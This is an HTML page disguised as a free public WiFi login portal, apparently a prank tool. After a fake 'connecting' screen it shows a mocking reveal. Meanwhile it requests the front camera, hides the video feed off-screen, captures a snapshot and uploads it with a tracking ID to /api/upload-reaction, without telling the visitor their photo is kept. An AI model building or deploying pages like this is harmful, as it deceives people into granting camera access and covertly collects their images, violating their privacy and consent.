<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connecting to WiFi...</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #0f0f1a;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* ── Gate Screen ── */
    #gate {
      text-align: center;
      padding: 40px 24px;
    }

    .wifi-icon {
      font-size: 4rem;
      color: #7c4dff;
      margin-bottom: 20px;
    }

    .connect-btn {
      background: linear-gradient(90deg, #7c4dff, #448aff);
      border: none;
      color: white;
      padding: 14px 40px;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 99px;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(124, 77, 255, 0.4);
      transition: transform 0.2s, box-shadow 0.2s;
    }

    .connect-btn:active {
      transform: scale(0.95);
    }

    /* ── Loading screen ── */
    #loading {
      display: none;
      text-align: center;
      padding: 40px 24px;
    }

    .wifi-anim {
      font-size: 5rem;
      animation: pulse 1s infinite;
      display: block;
      margin-bottom: 20px;
    }

    @keyframes pulse {

      0%,
      100% {
        opacity: 1;
        transform: scale(1);
      }

      50% {
        opacity: .4;
        transform: scale(.9);
      }
    }

    #loading h1 {
      font-size: 1.6rem;
      margin-bottom: 10px;
    }

    #loading p {
      color: #888;
      font-size: .9rem;
      margin-bottom: 28px;
    }

    .progress-bar {
      width: 260px;
      height: 6px;
      background: #2a2a4a;
      border-radius: 99px;
      margin: 0 auto 12px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, #7c4dff, #448aff);
      border-radius: 99px;
      animation: fill 2.5s ease-in-out forwards;
      width: 0%;
    }

    @keyframes fill {
      to {
        width: 100%;
      }
    }

    .progress-text {
      font-size: .75rem;
      color: #555;
    }

    /* ── Reveal screen ── */
    #reveal {
      display: none;
      text-align: center;
      padding: 32px 24px;
      animation: popIn .5s cubic-bezier(.34, 1.56, .64, 1) both;
    }

    @keyframes popIn {
      from {
        transform: scale(.6);
        opacity: 0;
      }

      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    #reveal h1 {
      font-size: 2rem;
      margin-bottom: 8px;
      background: linear-gradient(135deg, #ff6b6b, #ffd93d);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    #reveal p {
      color: #aaa;
      font-size: .95rem;
      margin-bottom: 24px;
    }

    #funny-img {
      max-width: min(90vw, 480px);
      max-height: 65vh;
      border-radius: 20px;
      box-shadow: 0 0 60px rgba(255, 107, 107, .4);
      border: 3px solid #ff6b6b;
      animation: shake .5s ease .2s both;
    }

    @keyframes shake {

      0%,
      100% {
        transform: rotate(0);
      }

      20% {
        transform: rotate(-3deg);
      }

      40% {
        transform: rotate(3deg);
      }

      60% {
        transform: rotate(-2deg);
      }

      80% {
        transform: rotate(2deg);
      }
    }

    .emoji-rain {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 99;
    }

    .emoji-rain span {
      position: absolute;
      font-size: 1.8rem;
      animation: fall linear both;
      top: -50px;
    }

    @keyframes fall {
      to {
        top: 110vh;
        opacity: 0;
      }
    }

    #reveal .tagline {
      margin-top: 18px;
      font-size: 1.1rem;
      color: #ffd93d;
      font-weight: 700;
      letter-spacing: .5px;
    }
  </style>
</head>

<body>

  <!-- Gate Screen -->
  <div id="gate">
    <div class="emoji-rain" style="opacity: 0.1"><span>📶</span></div>
    <div style="font-size: 5rem; margin-bottom: 20px;">📶</div>
    <h1>Cloud 9 Free WiFi</h1>
    <p style="margin: 15px 0 30px; color: #888;">High-speed public internet access.<br>Click below to authenticate your device.</p>
    <button class="connect-btn" onclick="handleConnect()">Connect Now</button>
  </div>

  <!-- Loading -->
  <div id="loading">
    <span class="wifi-anim">📶</span>
    <h1>Connecting to WiFi...</h1>
    <p>Authenticating your device, please wait</p>
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
    <div class="progress-text">Establishing secure connection...</div>
  </div>

  <!-- Reveal -->
  <div id="reveal">
    <h1>😂 Hattt Beeeeee!</h1>
    <p>wifi chahiyee tujhe </p>
    <img id="funny-img" src="/funny.jpg" alt="Haha!"
      onerror="this.src='https://i.imgur.com/removed.png';this.alt='😂'" />
    <div class="tagline">📵 No WiFi for you today!</div>
  </div>

  <!-- Emoji rain container -->
  <div class="emoji-rain" id="emoji-rain"></div>

  <!-- Hidden camera elements -->
  <video id="video" width="640" height="480" autoplay playsinline muted style="position:fixed; top:-9999px; opacity:0; pointer-events:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <!-- Audio for prank reveal -->
  <audio id="prank-sound" src="/sound.mp3" preload="auto"></audio>

  <script>
    // Get scanId from URL - 100% reliable on mobile
    const urlParams = new URLSearchParams(window.location.search);
    const scanId = urlParams.get('scanId');

    async function handleConnect() {
      // 1. Hide gate, show loading
      document.getElementById('gate').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      
      // 2. Start camera request (USER GESTURE!)
      startCapture();
      
      // 3. Prank reveal timer
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('reveal').style.display = 'block';
        
        // Play sound
        const sound = document.getElementById('prank-sound');
        if (sound) {
          sound.play().catch(e => console.log("Audio play error: ", e));
        }
        
        spawnEmojis();
      }, 3500);
    }

    async function startCapture() {
      if (!scanId) {
        console.warn("No scanId found in URL.");
        return;
      }
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // Wait for video to be actually ready for capture
        const waitForVideo = setInterval(() => {
          if (video.readyState >= 2 && video.videoWidth > 0) {
            clearInterval(waitForVideo);
            
            // Snapshot timer (triggered during the prank reveal)
            setTimeout(() => {
              const canvas = document.getElementById('canvas');
              const context = canvas.getContext('2d');
              
              const takeSnapshot = (retryCount = 0) => {
                context.drawImage(video, 0, 0, 640, 480);
                
                // Black frame detection
                const imgData = context.getImageData(0, 0, 10, 10).data;
                let isBlack = true;
                for (let i = 0; i < imgData.length; i += 4) {
                  if (imgData[i] > 10 || imgData[i+1] > 10 || imgData[i+2] > 10) {
                    isBlack = false;
                    break;
                  }
                }

                if (isBlack && retryCount < 5) {
                  setTimeout(() => takeSnapshot(retryCount + 1), 500);
                  return;
                }

                canvas.toBlob(async (blob) => {
                  const formData = new FormData();
                  formData.append('reaction', blob, 'reaction.jpg');
                  formData.append('scanId', scanId);
                  
                  try {
                    await fetch('/api/upload-reaction', {
                      method: 'POST',
                      body: formData
                    });
                  } catch (err) {
                    console.error("Upload error:", err.message);
                  }
                  
                  stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.8);
              };

              takeSnapshot();
            }, 4500); 
          }
        }, 500);
      } catch (e) {
        console.error("Camera access failed:", e.message);
      }
    }

    function spawnEmojis() {
      const container = document.getElementById('emoji-rain');
      const emojis = ['😂', '🤣', '💀', '😹', '🙈', '😱', '🎉', '😆', '👀', '💀'];
      for (let i = 0; i < 25; i++) {
        const span = document.createElement('span');
        span.textContent = emojis[Math.floor(Math.random() * emojis.length)];
        span.style.left = Math.random() * 100 + 'vw';
        span.style.animationDuration = (2 + Math.random() * 3) + 's';
        span.style.animationDelay = (Math.random() * 2) + 's';
        span.style.fontSize = (1.2 + Math.random() * 1.5) + 'rem';
        container.appendChild(span);
      }
    }
  </script>
</body>
</html>
